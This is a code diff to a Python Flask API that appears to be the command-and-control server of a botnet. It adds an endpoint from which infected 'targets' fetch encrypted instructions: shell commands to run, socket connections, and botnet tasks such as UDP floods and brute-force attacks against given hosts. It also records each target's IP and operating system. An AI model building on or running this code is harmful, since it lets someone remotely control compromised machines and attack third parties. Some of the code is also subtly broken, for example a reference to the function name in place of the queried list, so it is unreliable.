@@ -32,7 +32,7 @@ import base64
 import json
 import os
 
-from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet, Instraction_Detail
+from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet, Instruction_Detail
 from db.mange_db import config, _create_engine
 from utility.email_temp import email_temp
 from utility.processer import log, getlist, readFromJson, update_output, update_user_info, update_target_info, update_socket_info, update_code_output
@@ -266,14 +266,36 @@ def registor_target():
 
 @api.route('/api/get_instraction/<target_name>')
 def instarction(target_name):
-    """API endpoint to retrieve instructions for a given target.
-    This endpoint allows clients to retrieve instructions for a specific target
-    by providing the target name and API token.
+    """
+    API endpoint to retrieve instructions for a given target.
+    explanation: This endpoint allows a target to fetch its instructions
+                based on a valid API token. It retrieves both system and user-specific instructions
+                from the database and returns them in a structured format.
     Args:
         target_name (str): The name of the target for which instructions are being requested.
     Returns:
-        JSON response containing the delay and instruction for the target if the API token is valid.
+        JSON response containing instructions for the target if the API token is valid.
         If the API token is invalid or not provided, returns an error message.
+    
+    Note: The response includes:
+    - instraction: The main instruction for the target.
+    - Delay: The delay associated with the instruction.
+    - user_instarcton: A dictionary of user-specific instructions categorized by type (CMD, Web, Socket).
+    - sys_instraction: A dictionary of system instructions, including socket and botnet details.
+    Example response:
+    {
+        "instraction": "connectBySocket",
+        "Delay": 15,
+        "user_instarcton": {
+            "CMD": ["command1", "command2"],
+            "Web": "http://example.com",
+            "Socket": {"host": "localhost", "port": 8080}
+        },
+        "sys_instraction": {
+            "socket": {"host": "socket_host", "port": 1234},
+            "botnet": {"udp-flood": {"host": "botnet_host", "port": 80}, "bruteForce": {"host": "botnet_host", "thread": 10}}
+        }
+    }
     """
     if request.method == 'GET':
         try:
@@ -292,7 +314,7 @@ def instarction(target_name):
 
             if len(valid) != 0:
                 instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, stutas=config.STUTAS[0]).all(), sp=',')
-                user_instractions = getlist(_session.query(Instraction_Detail).filter_by(user_email=user_email).all(), sp=',')
+                user_instractions = getlist(_session.query(Instruction_Detail).filter_by(userEmail=user_email).all(), sp=',')
 
                 user_instraction = {
                     'instraction': instarction[0][3],
@@ -300,6 +322,29 @@ def instarction(target_name):
                     'user_instarcton':{},
                     'sys_instraction': {}
                 }
+                
+                user_ins = {}
+                for ins in user_instractions:
+                    if ins[3].split(',')[0] == config.INSTRACTION_TYPE[0]:  # CMD
+                        commands = ins[2].split(',')
+                        user_ins['CMD'] = commands
+                    elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[2]:  # CodeInjection
+                        # TODO: handle code injection if needed
+                        pass
+                    elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[3]:  # Web
+                        if ins[3].split(',')[1] == target_name:
+                            user_ins['Web'] = ins[2]
+                    elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[4]:  # Socket
+                        if ins[3].split(',')[1] == target_name:
+                            user_ins['Socket'] = {
+                                'host': ins[6],
+                                'port': ins[5]
+                            }
+                    elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[1]:  # BotNet
+                        if ins[0]:
+                            ...
+                user_instraction['user_instarcton'] = user_ins
+
                 if len(user_instractions) != 0 and len(instraction) != 0:
                     if IP != readFromJson('target-info', target_name)['ip']:
                         update_target_info(target_name, IP, opratingSystem)
@@ -312,7 +357,22 @@ def instarction(target_name):
                             }
                         }
                     elif instraction[0][3] == config.INSTRACTION[2]:  # BotNet
-                        ...
+                        botnet_info = getlist(_session.query(APILink).filter_by(target_name=target_name).all(), sp=',')
+                        botnetType = [config.ACTION_TYPE[0],config.ACTION_TYPE[2]]
+                        botnet_details = {}
+                        for bot in botnet_info:
+                            if bot[4] in botnetType:
+                                # udp-flood
+                                if bot[4] == config.ACTION_TYPE[0]:
+                                    host = bot[3]
+                                    port = bot[6]
+                                    botnet_details[bot[4]] = {'host': host, 'port': port}
+                                # bruteForce
+                                elif bot[4] == config.ACTION_TYPE[2]:
+                                    host = bot[3]
+                                    thread = bot[6]
+                                    botnet_details[bot[4]] = {'host': host, 'thread': thread}
+                        user_instraction['sys_instraction'] = {'botnet': botnet_details}
                     return jsonify(encrypt_payload(user_instraction)), 200
                 return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
             else:
